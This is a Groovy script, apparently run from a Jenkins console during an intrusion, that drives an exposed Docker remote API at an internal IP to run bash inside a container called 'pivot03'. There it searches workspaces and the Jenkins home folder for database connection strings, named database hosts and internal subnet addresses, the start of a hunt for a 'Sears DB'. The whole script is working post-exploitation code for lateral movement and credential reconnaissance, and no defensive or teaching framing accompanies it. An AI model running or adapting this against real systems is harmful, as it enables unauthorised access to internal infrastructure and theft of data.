// Hunt Sears DB: grep container volumes for DB configs + sweep upper 141.x subnet
dockerApi = "http://172.27.140.148:4243"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(180000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String containerId, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

// 1) Grep for DB connection strings in pivot03 workspace + jenkins home
def grepCmd = '''
echo "### VOLUMES in pivot03 ###"
ls -la /workspace/ 2>/dev/null | head -30
ls -la /home/jenkins/.jenkins/ 2>/dev/null | head -30
echo "### GREP dbasears/apifincadob/3308/mrc-services ###"
grep -rIl --exclude-dir=.git -e dbasears -e apifincadob -e mrc-services -e "3308" /workspace /home/jenkins 2>/dev/null | head -40
echo "### GREP jdbc:mysql / mysqli / PDO hosts ###"
grep -rIoE --exclude-dir=.git "(jdbc:mysql://|mysql://|mysqli|new PDO)[^\"'"'"' )]*" /workspace /home/jenkins 2>/dev/null | grep -vE "(vendor|node_modules)" | head -60
echo "### GREP 172.27.141 / 172.26 in configs ###"
grep -rIoE --exclude-dir=.git "172\\.(27\\.141|26)\\.[0-9]+" /workspace /home/jenkins 2>/dev/null | sort | uniq -c | sort -rn | head -40
echo "GREP_DONE"
'''
println "########## GREP pivot03 volumes ##########"
println execIn("3b389d5bf116", grepCmd)
